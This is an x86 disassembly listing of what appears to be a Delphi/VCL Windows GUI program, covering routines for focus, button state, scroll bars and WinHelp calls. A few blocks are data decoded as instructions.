pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_434ae8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43fde0
mov eax ebx
mov si 0xffb5
call sub_403420
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4423cc
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403420
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_434b60
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42bf68
mov ebx eax
mov eax ebx
call sub_42c048
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4423cc
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42c148
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434bac
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42bf68
call sub_42c048
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_440820
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_434bd8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f258
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_434c10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434a1c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43b388
mov edx 0x19
mov eax esi
call sub_43b3ac
mov dl 0x1
mov eax esi
call sub_442600
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_434c9c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4426d0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4423cc
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4423cc
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_434cf0
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4426d0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_452980
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43cd98
sub_434d24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434bd8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43f184
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_434d8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_441848
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_452888
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403420
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434df9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434e72
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_452910
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_441850
mov eax ebx
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403420
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e79
sub_434e80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_441858
pop edi
pop esi
pop ebx
retn
sub_434ed4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42bf68
call sub_42c048
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_434f00
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42bf68
mov ebx eax
mov eax ebx
call sub_42c048
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4423cc
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42c148
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434f4c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434a1c
mov edx 0x71
mov eax esi
call sub_43b388
mov edx 0x11
mov eax esi
call sub_43b3ac
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_434fb4
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403420
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_434ff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43f0c0
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_448428
sub_4350b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442600
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
push ebp
call sub_434ff4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43b7d8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403420
sub_43513c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_434bd8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43f184
mov eax ebx
mov si 0xffc8
call sub_403420
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_435193
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5e19173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
sub_4351c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43523d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_452910
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_441850
mov eax ebx
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435244
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_43524c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403420
jmp r-xdata
pop esi
retn
sub_43527c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43e0f8
mov edx 0x79
mov eax esi
call sub_43b388
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_43b3ac
mov dl 0x1
mov eax esi
call sub_442600
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_435334
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43f258
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43f184
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_435474
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403420
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4353c4
call sub_43b56c
mov eax ebx
call sub_43f384
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_43b58c
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollInfo
mov eax ebx
call sub_435474
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_435474
push ebx
mov ebx eax
mov eax ebx
call sub_43c210
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_435494
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_43f96c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_4354d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_435607
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4426d0
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43560e
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403420
mov eax ebx
call sub_435474
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollPos
jmp r-xdata
sub_43562c
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_4426d0
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call SetScrollInfo
sub_4356f4
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_435719 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4423cc
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_435474
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403420
mov edx [ esp ]
mov eax ebx
call sub_435618
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_43581c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4423cc
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_43584c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435871
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435878
retn
sub_435978
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448278
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4359b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4359d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4359e0
retn
sub_4359ec
push esi
inc esi
add al dh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43634f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4364dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436356
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f80
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407e94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_436434
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407e94
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fb0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_435b98
mov eax [ ebp - 0x14 ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_435a84
pop edx
inc ebx
add [ edi + 0x5a ] ch
inc ebx
add [ ecx + 0x5a ] bh
inc ebx
add [ 0x2500435a ] bl
pop edx
inc ebx
add [ 0x3500435a ] ch
pop edx
inc ebx
add [ 0x4500435a ] bh
outsd
pop edx
cmp al [ edx + ebx * 2 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop edx
inc ebx
add [ ebp + 0x5a ] cl
inc ebx
add [ ebp + 0x5a ] dl
inc ebx
add [ ebp + 0x5a ] bl
inc ebx
add ch bh
pop ecx
inc ebx
add [ 0xd00435a ] al
pop edx
inc ebx
add [ 0xfffffffff500435a ] dl
inc ebp
cmp al [ edx + ebx * 2 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop ecx
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc eax 0xf500435a
cmp al [ edx + ebx * 2 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
pop ebx
inc ebx
add al cl
pop edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2400435b ] al
add [ eax ] al
add [ ecx + edx + 0x34540040 ] dl
inc eax
add [ eax ] bl
push esi
inc eax
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ esi + edx * 2 ] dh
inc eax
add al bl
xor [ eax ] eax
or al 0x66
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
hlt
sub_435b98
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435c4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f5c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403ff4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435c54
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042dc
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_435c68
push ebx
mov ebx eax
mov eax ebx
call sub_435f98
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405598
sub_435ca4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435d0b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_435b98
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435d12
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_435d1c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_435da4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_435c90
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042dc
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435dab
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
sub_435db7
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_435e3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4364dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e46
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_435b98
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_435dc4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_435e3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4364dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e46
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_435b98
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_435e4c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435f44
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_435b98
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov eax ebx
call sub_4364dc
test al al
je r-xdata
mov ecx sub_4359ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
xor eax eax
pop edx
